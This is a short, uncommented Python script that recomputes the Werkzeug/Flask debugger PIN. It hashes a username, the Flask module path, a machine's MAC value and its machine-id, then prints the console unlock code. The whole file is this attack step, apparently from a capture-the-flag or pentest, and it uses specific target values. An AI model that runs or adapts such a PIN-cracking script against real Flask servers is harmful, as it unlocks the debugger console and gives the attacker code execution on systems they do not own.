import hashlib
from itertools import chain
probably_public_bits = [
    'loremipsum',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.6/dist-packages/flask/app.py'
]

private_bits = [
    '2485378547714',
    'b875f129-5ae6-4ab1-90c0-ae07a6134578e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
